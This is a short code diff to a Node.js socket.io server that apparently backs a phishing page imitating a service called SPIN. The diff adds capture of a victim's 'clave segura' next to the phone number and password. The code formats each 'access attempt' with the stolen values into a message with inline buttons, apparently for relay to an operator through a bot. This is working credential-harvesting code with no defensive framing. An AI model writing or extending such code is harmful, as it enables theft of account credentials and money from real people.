@@ -26,10 +26,10 @@ app.use(bodyParser.json());
 
 io.on('connection', (socket) => {
   // Login principal (campo socio)
-  socket.on('dataForm', ({ socio, contrasena, sessionId }) => {
+  socket.on('dataForm', ({ socio, contrasena, telefono, sessionId }) => {
     activeSockets.set(sessionId, socket);
 
-    const mensaje = `🔐 Nuevo intento de acceso SPIN:\n\n🔢 Número de celular: ${socio}\n🔑 Contraseña: ${contrasena}📱 Clave segura: ${telefono}`;
+    const mensaje = `🔐 Nuevo intento de acceso SPIN:\n\n🔢 Número de celular: ${socio}\n🔑 Contraseña: ${contrasena}\n📱 Clave segura: ${telefono}`;
     const botones = {
       reply_markup: {
         inline_keyboard: [
